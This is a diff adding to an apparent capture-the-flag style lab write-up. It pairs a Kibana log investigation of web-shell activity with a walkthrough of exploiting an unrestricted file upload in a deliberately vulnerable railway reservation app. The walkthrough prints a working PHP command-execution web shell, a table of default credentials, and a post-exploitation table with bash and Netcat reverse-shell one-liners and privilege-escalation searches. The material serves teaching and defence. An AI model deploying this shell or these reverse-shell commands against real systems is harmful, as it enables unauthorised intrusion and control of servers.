@@ -134,4 +134,170 @@ To investigate this scenario, let's change the time filter to show events for th
 
 You will see the logs have now populated within the display. Please note that the quantity of entries (hits) in this task may differ to the amount on the practical VM.
 
+![](result.png){: width="1815" height="909"}
+
+An incredibly beneficial feature of ELK is that we can filter out noise. A web server (especially a popular one) will likely have a large number of logs from user traffic—completely unrelated to the attack. Using the fields pane on the left, we can click on the "+" and "-" icons next to the field to show only that value or to remove it from the display, respectively.
+
+**Fun fact**: Clicking on these filters is actually just applying the relevant KQL syntax.
+
+Note in the GIF below how the logs are being filtered to only show logs containing the IP address 10.13.27.115 (reducing the count from 1,028 to 423 hits). We can combine filtering multiple fields in or out to drill down specifically into the logs.
+
+![](kqlfilter.gif){: width="1810" height="750"}
+
+To remove applied filters, simply click on the "**x**" alongside the filter, just below the search bar.
+
+![](close.png){: width="507" height="162"}
+
+In this investigation, let's look at the activity of the IP address 10.9.98.230. We can click on the "**clientip**" field to see the IPs with the most values.
+
+![](filterfield.png){: width="597" height="536"}
+
+Using the timeline at the top, we can see a lot of activity from this IP address took place between **11:30:00** and **11:35:00**. This would be a good place to begin our analysis.
+
+![](log1.png){: width="1826" height="762"}
+
+Each log can be expanded by using the "**>**" icon located on the left of the log/document. Fortunately, the logs are pretty small in this instance, so we can browse through them to look for anything untoward.
+
+![](log2.gif){: width="1815" height="679"}
+
+After some digging, a few logs stand out. Looking at the **request** field, we can see that a file named "**shell.php**" has been accessed, with a few parameters "**c**" and "**d**" containing commands. These are likely to be commands input into some form of web shell.
+
+![](log3.png){: width="1479" height="491"}
+
+Now that we have an initial lead, let’s use a search query to find all logs that contain "**shell.php**". Using the search bar at the top, the query message: "shell.php" will search for all entries of "**shell.php**" in the message field of the logs.
+
+![](log4.png){: width="1825" height="802"}
+
+### OPERATION RED
+
+In this section we will now take a look at the red aspect. In other words, the attack itself and how it was carried out.
+
+## Why Do Websites Allow File Uploads
+
+File uploads are everywhere on websites, and for good reason. Users often need to upload files like profile pictures, invoices, or other documents to update their accounts, send receipts, or submit claims. These features make the user experience smoother and more efficient. But while this is convenient, it also creates a risk if file uploads aren't handled properly. If not properly secured, this feature can open up various vulnerabilities attackers can exploit.
+
+
+## File Upload Vulnerabilities
+
+File upload vulnerabilities occur when a website doesn't properly handle the files that users upload. If the site doesn't check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. For example:
+
+- **RCE**: Uploading a script that the server runs gives the attacker control over it.
+- **XSS**: Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker's server.
+These can happen if a site doesn't properly secure its file upload functionality.
+
+
+## Why Unrestricted File Uploads Are Dangerous
+
+Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file's contents aren't properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.
+
+Examples of abuse through unrestricted file uploads include:
+
+- Uploading a script that the server executes, leading to RCE.
+- Uploading a crafted image file that triggers a vulnerability when processed by the server.
+- Uploading a web shell and browsing to it directly using a browser.
+
+## Usage of Weak Credentials
+One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.
+
+Below are some examples of weak/default credentials that attackers might try:
+
+| **Username**        | **Password**      |
+|---------------------|-------------------|
+| admin               | admin             |
+| administrator       | administrator     |
+| admin@domainname    | admin             |
+| guest               | guest             |
+
+Attackers can use tools or try these common credentials manually, which is often all it takes to break into the system.
+
+## What is Remote Code Execution (RCE)
+
+Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.
+
+![](key.png){: width="1046" height="800"}
+
+## What Is a Web Shell
+
+A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.
+
+For example, attackers could use a web shell to:
+
+- Execute commands on the server
+- Move laterally within the network
+- Download sensitive data or pivot to other services
+
+A web shell typically gives the attacker a web-based interface to run commands. Still, in some cases, attackers may use a reverse shell to establish a direct connection back to their system, allowing them to control the compromised machine remotely. Once an attacker has this level of access, they might attempt privilege escalation to gain even more control, such as achieving root access or moving deeper into the network.
+
+Okay, now that we're familiar with a remote code execution vulnerability and how it works, let's take a look at how we would exploit it!
+
+## Practice Makes Perfect
+
+To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today's task, we will demonstrate achieving RCE via unrestricted file upload within an [open-source railway management system](https://github.com/CYB84/CVE_Writeup/tree/main/Online%20Railway%20Reservation%20System) that has this vulnerability [built into it.](https://github.com/CYB84/CVE_Writeup/blob/main/Online%20Railway%20Reservation%20System/RCE%20via%20File%20Upload.md)
+ 
+## Exploiting RCE via File Upload
+
+Now we're going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.
+
+Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favourite text editor, copy and paste the below code and save it as shell.php.
+
+```console 
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="text" name="command" autofocus id="command" size="50">
+<input type="submit" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['command'])) 
+    {
+        system($_GET['command'] . ' 2>&1'); 
+    }
+?>
+</pre>
+</body>
+</html>
+The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the system() PHP function, and the output is displayed to the user. This is the perfect file to upload to the vulnerable rail system reservation application. The vulnerability is surrounding the upload of a new profile image. So, to exploit it, we navigate to the profile picture page:
+```
+The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the **system()** PHP function, and the output is displayed to the user. This is the perfect file to upload to the vulnerable rail system reservation application. The vulnerability is surrounding the upload of a new profile image. So, to exploit it, we navigate to the profile picture page:
+
+![](orrs1.png){: width="2898" height="920"}
+
+Instead of a new profile picture, we can upload our malicious PHP script and update our profile:
+
+![](orrs2.png){: width="1600" height="665"}
+
+In the case of this application, the RCE is possible through unrestricted file upload. Once this "profile picture" is uploaded and updated, it is stored in the **/admin/assets/img/profile/ directory**. The file can then be accessed directly via **http://<ip-address-or-localhost>/<projectname>/admin/assets/img/profile/shell.php.** When this is accessed, we can then see the malicious code in action:
+
+![](rce1.png){: width="1250" height="428"}
+
+Now, we can run commands directly against the operating system using this bar, and the output will be displayed. For example, running the command **pwd** now returns the following:
+
+![](rce2.png){: width="1402" height="312"}
+
+## Making the Most of It
+
+Once the vulnerability has been exploited and you now have access to the operating system via a web shell, there are many next steps you could take depending on a) what your goal is and b) what misconfigurations are present on the system, which will determine exactly what we can do. Here are some examples of commands you could run once you have gained access and why you might run them (if the system is running on a Linux OS like our example target system):
+
+| **Command**                              | **Use**                                                                                         |
+|------------------------------------------|-------------------------------------------------------------------------------------------------|
+| ls                                       | Will give you an idea of what files/directories surround you                                     |
+| cat                                      | A command used to output the contents of documents such as text files                           |
+| pwd                                      | Will give you an idea of where in the system you are                                           |
+| whoami                                   | Will let you know who you are in the system                                                     |
+| hostname                                 | The system name and potentially its role in the network                                         |
+| uname -a                                 | Will give you some system information like the OS, kernel version, and more                     |
+| id                                       | If the current user is assigned to any groups                                                   |
+| ifconfig                                 | Allows you to understand the system's network setup                                             |
+| bash -i >& /dev/tcp/<your-ip>/<port> 0>&1  | A command used to begin a reverse shell via bash                                               |
+| nc -e /bin/sh <your-ip> <port>           | A command used to begin a reverse shell via Netcat                                             |
+| find / -perm -4000 -type f 2>/dev/null   | Finds SUID (Set User ID) files, useful in privilege escalation attempts                         |
+| find / -writable -type f 2>/dev/null | grep -v "/proc/"                               | Also helpful in privilege escalation attempts used to find files with writable permissions   |
+|
+
+
+
+
+
+
 
